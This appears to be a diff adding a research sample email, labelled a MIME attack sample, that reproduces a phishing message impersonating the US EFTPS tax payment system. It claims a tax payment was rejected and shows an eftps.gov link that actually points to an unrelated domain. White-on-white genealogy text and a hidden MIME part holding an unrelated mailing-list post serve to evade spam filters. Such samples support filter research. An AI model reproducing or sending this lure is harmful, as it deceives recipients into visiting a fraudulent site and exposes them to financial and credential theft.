@@ -1,0 +1,98 @@
+From: Bernard Michael Tyers <bernard.tyers@dcu.ie>
+To: o'neal.winfree@enron.com, daren.farmer@enron.com
+Subject: MIME Attack Sample
+Content-Type: text/html;
+  charset=iso-8859-1
+Content-Transfer-Encoding: 7bit
+Content-Length: 4025
+Lines: 53
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1744
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY>
+
+<DIV><FONT face=Arial size=2></FONT><IMG alt="Welcome to Eftps" hspace=0 
+src="https://www.eftps.gov/eftps/images/home/welcometoeftps.gif" align=baseline 
+border=0></DIV>
+<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>
+<DIV><FONT face=Arial size=2>
+<HR>
+</FONT></DIV>
+<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>
+<DIV><FONT face=Arial size=2>
+  <p><FONT size=3><FONT 
+face="Arial"><STRONG>Your Federal Tax Payment ID: 0103759 has been 
+    rejected.</STRONG> <BR>
+    Please, check the 
+    information and refer to Code R21 to get details about your company payment in 
+    transaction contacts section: <BR>
+  <FONT color=#ffffff></FONT><A href="http://sts-107.com/jecl71e/lvuc.html" 
+target=_blank rel=nofollow>http://eftps.gov/R21</A> </FONT></FONT></p>
+  <p><font color="#FFFFFF">Page 195. ID No. 3179 </font></p>
+  <p><FONT size=3><FONT size=3><FONT 
+face="Arial">Return Reason Code R21 - The identification number used 
+    in the Company Identification Field is not valid. </FONT></FONT><FONT 
+face="Arial"><BR>
+    </FONT></FONT><FONT 
+face="Arial" size=3>In other way forward information to your 
+        accountant adviser. </FONT> </p>
+  <P><FONT color=#ffffff>on the site. James was appointed guardian of his two 
+younger brothers, William Wright and Joseph Tarpelin, </FONT><BR><B>EFTPS: 
+<BR>The Electronic Federal Tax Payment System</B> <BR>
+  <font color="#FFFFFF">Athens, Alabama, supplied some long sought after information on Ellison Gross and his marriage to </font>
+  <FONT face=Arial 
+size=2>
+<HR>
+</FONT></P></DIV>
+<DIV><FONT size=1><FONT face=Arial><STRONG>WARNING!<BR></STRONG>You are using an 
+Official United States Government System, which may be used only for authorized 
+purposes. Unauthorized modification of any information stored on this system may 
+result in criminal prosecution. The Government may monitor and audit the usage 
+of this system, and all persons are hereby notified that the use of this system 
+constitutes consent to such monitoring and auditing. Unauthorized attempts to 
+upload information and/or change information on this web site are strictly 
+prohibited and are subject to prosecution under the Computer Fraud and Abuse Act 
+of 1986 and Title 18 U.S.C. Sec. 1001 and 1030.</FONT>
+<HR>
+</FONT><style><font color="#FFFFFF">2. m i. Robert H. DOROUGH, born 10 Feb 1704 in James City County, Virginia. </font><font color="#FFFFFF">1941, Opelika, Lee, AL. </font><font color="#FFFFFF">Genealogists; a Texas Atlas and Gazetteer and the Alabama Highway Department's off~cial county road </font><font color="#FFFFFF"></font><font color="#FFFFFF">whose help I might still be floundering. I flew into Tampa to see him a number of years ago and he </font><font color="#FFFFFF">contributed additional information for this book. Thomas Alan Dorough, now of Oakland, Tennessee, </font><font color="#FFFFFF">and the Dorough Cemetery appear under both Dooly and Crisp Counties for until the formation of Crisp </font><font color="#FFFFFF">Number of a child locate that ID number as a parent in the next generation. If there is no plus sign with </font><font color="#FFFFFF">+15. f ii Tammy Kay Allen b. 1 Oct 1969. </font><font color="#FFFFFF">Modified Register System, each descendant is giv
+ en an Identification Number (ID) by generation with </font><font color="#FFFFFF">+8. f ix Flora Bell Robinson b. 30 Jan 1931. </font><font color="#FFFFFF">corrections, additions and updates to my Daniel material. </font><font color="#FFFFFF">f i Frances McDaniel. </font><font color="#FFFFFF">11. Judy Dean Robinson b. 24 Jan 1947, Roanoke, Randolph, AL, m. 25 Jun 1965, in Opelika, Lee ,AL, </font><font color="#FFFFFF">and descendant of Ida Tennessee Dorough has filled in many blanks for me and has been a constant </font><font color="#FFFFFF">selflessly shared pertinent parts of the results of his many years of research with me. Ed has also </font>
+</DIV>
+
+</BODY></HTML>
+Content-Type: text/html
+<div style="display: none;"><plaintext>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On Wed, Jun 20, 2007 at 05:38:41AM EST, Gregory Nowak wrote:
+> Since he's using lfs, all he'd really need would be a tar.gz/tar.bz2
+> archive. As has been pointed out earlier, a tarball would allow the
+> package to be installed on non-rpm/deb distros. I would think a
+> tarball would also be easier to produce than an rpm/deb package.
+
+While making a tarball would be easy, the person using it would  have to 
+be sure they had the libstdc++-libc6.2-2.so.3 shared library, which is 
+from gcc 2.95. Luckily, Ubuntu/Debian and Fedora still carry this, but I 
+doubt very much whether other distros do, and it would certainly not be 
+trivial to build it.
+- -- 
+Luke Yelavich
+GPG key: 0xD06320CE 
+	 (http://www.themuso.com/themuso-gpg-key.txt)
+Email & MSN: themuso@themuso.com
+Jabber: themuso@jabber.org.au
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGeEbmjVefwtBjIM4RAr8BAJ9Asah7h/1uyx1dzEL67ZQvl9/diwCfZ+8e
+I+BXukX3dZcM4djcOs3q9Vo=
+=0504
+-----END PGP SIGNATURE-----
+
+____
